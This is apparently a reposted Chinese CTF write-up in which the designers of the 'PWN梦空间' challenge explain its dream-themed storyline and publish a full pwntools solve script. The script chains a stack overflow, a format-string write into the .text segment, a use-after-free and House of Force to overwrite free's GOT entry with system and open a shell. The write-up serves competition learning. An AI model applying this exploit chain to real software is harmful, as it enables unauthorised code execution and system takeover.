# 【WP】春秋杯秋季赛“PWN梦空间”|设计思路与解析

> 原文: https://www.ctfiot.com/23827.html
> ID: 23827

本题由春秋GAME伽玛实验室设计，赛后将该题的设计思路公开，供大家学习交流。

00 楔子

深入梦境，你会发现，一切事物都在不断循环，随着梦境的加深，时间也变得缓慢。

本题考点如下：

1. city：linux命令使用
2. hotel：栈溢出，ret2text
3. snow：格式化字符串，任意地址写，.text 段RWX
4. home：UAF
5. world：House of force
6. final：隐藏文件分析

01 进入梦境
你孤身一人，周围的环境陌生又熟悉，你只有获得每一层关卡的规则，才能醒来。

旅馆中有一个名为“栈”的前台，“我能帮到你么？”他用着机械的口语向你问候，并带着僵硬的微笑。但你并不在意，你迫切地想知道现在到底在什么地方，究竟发生了什么。但你的无数的问题，换来的仍是冷冰冰的“我能帮到你么？”；你和“栈”不停的交谈，尽管获得的回答毫无意义，当你“垂头丧气”之时，“栈”突然崩溃冒烟，他竟然是一个机器人。

在你拿到通行证的那一刻，旅馆中突然下起大雪，待你回过神来，你直接来到冰天雪地之中。

但暴风雪很大，你的身体已经僵硬，你只有一次格式化字符串的机会，能刻的字符数非常少。

获取权限的刹那，走廊四周悬空，你来到了里世界中“gamma world”中，看到里世界的出口有着如钻石坚硬的墙壁。你明白只要自己生成“放弃，沮丧，烦躁”等负面情绪，便可以获得新的技能，直接走出里世界了，但当你准备放弃之时，你的潜意识却告诉你放弃将永远留在这里，你意识到前面的一次次放弃让你堕落在这深层的梦境中。你要凭借自己的能力走出这里。

“你奋起一拳打在出口的墙壁上。”

“你被传送到城市的入口处。”

“你忘了发生的一切。”

“…..”

无尽的循环，永恒的时间。

每当你来到钻石墙壁前时才会想起一切，当你奋起一拳砸向墙壁时，便会被传送到城市入口忘记一切。

敲碎墙壁，得到next通行证，获取到root权限后，发现有 life 、 death 文件夹，分别检查两个文件夹，发现life文件夹中有很多 flxxg的文件。

10 结语

在开始设计题目时，就想着能否将“盗梦空间”不同梦境层次和“神秘博士拯救克拉拉”的剧情结合在一起，所以采用了上述的构思方案。在最后的death目录时，最早想着要是能够使环境切换到最开始的city目录，并把flag放置在最开始的目录，将会是一种很好玩的策略，最后因为各种限制条件，还是放弃了这种方案。

另外在制作snow题目的时候，发现代码被gcc自动优化了（本来main函数中还有一个vuln函数，函数中包括格式化字符串漏洞），所有的代码流程全部被集成在了main函数里面，这样就无法通过一次的fmt劫持返回地址到后门函数。本着代码能够写出来就尽量不要改动的原则，就思考能不能有其他比较好玩的解决方法，然后就有了直接修改.text段的这种路线～

梦最终都是虚假的，正如梦中的生门，看起来里面有非常多的flag，如果觉得真正的flag就藏在里面，仔细寻找的话，就会迷失在梦境里面，永远无法回归现实。但如果选择死门，看似毫无头绪，但是你会从中发现梦境的瑕疵点，突破永恒的梦境。

在春秋杯联赛社区，每场比赛的结束都并不意味着赛季的结束，后续我们还会有持续的学习以及丰富的活动。解题思路讲解、题目开源、免费练习平台，开放的社区讨论、技术经验分享沙龙聚会，CTF周边…


```
1. city：linux命令使用
2. hotel：栈溢出，ret2text
3. snow：格式化字符串，任意地址写，.text 段RWX
4. home：UAF
5. world：House of force
6. final：隐藏文件分析
```



```
hotel_backdoor = 0x4006B6
sla('you?n',b'a'*0x38+p64(hotel_backdoor))
sla('you!','./next')
```



```
sla('you?n',b'%1515c%43$naaaa')
sla('you!','./next')
```



```
1. 覆盖top chunk，修改为 -1
2. 将大部分got表中的函数都执行一次，以便写入真实地址
3. 使用 house of force ，将 top chunk 迁移到 got 区域
4. 将free.got替换为text中的 puts-ret gadget，这样就可以leak地址了
5. 覆盖bss中的create_lock，使得我们可以继续执行一次覆盖top_chunk的操作。
6. 重新覆盖got中的free函数为system函数，最后触发system('/bin/sh')
```



```
#!/usr/bin/python3
from pwn import *

sd=lambda x:p.send(x)
sl=lambda x:p.sendline(x)
sda=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
ru=lambda x:p.recvuntil(x)
rv=lambda x:p.recv(x)
io=lambda :p.interactive()
ps=lambda :pause()

context.log_level = 'debug'
i64_max = (1<<64)-1

p = remote('192.168.99.133','10006')
libc = ELF('./libc-2.23.so')
# level 1
sla('(y/n)','y')
sl('./next')

# level 2
hotel_backdoor = 0x4006B6
sla('you?n',b'a'*0x38+p64(hotel_backdoor))
sla('you!','./next')

# level 3
# x05xeb
# jmp $5
sla('you?n',b'%1515c%43$naaaa')
sla('you!','./next')

# level 4
sla('go?n','bedroom')
sla('go?n','bedroom')
sda('name: ',b'ax00'*8 + p64(0x400896))
sla('go?n','a')
sl('./next')

# level 5
def add(size, name, ac = True):
    if type(name) == str:
        name = name.encode()
    payload = 'create ' + str(size) + ' '
    payload = payload.encode() + name
    if ac:
        sla('accept',payload)
    else:
        sl(payload)

def free(name, ac = True):
    if type(name) == str:
        name = name.encode()
    payload = b'destory ' + name
    if ac:
        sla('accept',payload)
    else:
        sl(payload)

sla('?n','create')

ru('address is: ')
heap_address = int(ru('n'),16)
print('heap_address: ', hex(heap_address))
sda('name: ',b'a'*0xf8 + p64(i64_max))

# padding
add(0x18, 'aaa', False)
add(0x18, 'bbb')
add(0x18, 'ccc')
add(0x18, 'ddd')
add(0x18, 'eee')
free('ccc')
free('aaa')
add(0x18, 'aaa')

free_got = 0x602018

# house of force
add(str(free_got - heap_address - 0x100 - 0x80 - 0x18 - 0xc0), 'bbbb')

free('ddd')
free('aaa')
magic_addr = 0x4010CF

# overflow free
add(0x88,b'a'*8+p64(magic_addr).replace(b'x00',b't')[:-1])

add(0x28,b'a'*0x10)

# overflow world_core and overwrite objs
sl('create')
sla('name: ',p64(0) + p32(0) + p32(2) + p64(0x6020e0) + p64(0x602030) + b'x00' * (0xf8-0x20) + p64(i64_max))

free('world',False)
ru('world.n')
 
puts_address = u64(rv(6)+b'x00x00')
libc.address = puts_address - libc.sym['puts']
print('libc->',hex(libc.address))

sys = libc.sym['system']
sh = next(libc.search(b'/bin/sh'))
add(str(free_got - 0x6021c0 - 0x20),'cccc', False)

ones = [0x45216,0x4526a,0xf02a4,0xf1147]
one = libc.address + ones[3]

add(0x88,b'a'*8+p64(sys).replace(b'x00',b't')[:-1])
add(0x18,b'/bin/shx00')
free('world',False)

sl('./next')
ru('world!n')
sl('cat .../.really_flag')
io()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1642819472.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1642819473.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/10-1642819473.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/1-1642819474.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1642819474.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/8-1642819474.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/0-1642819475.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1642819475.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/5-1642819475.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1642819476.png)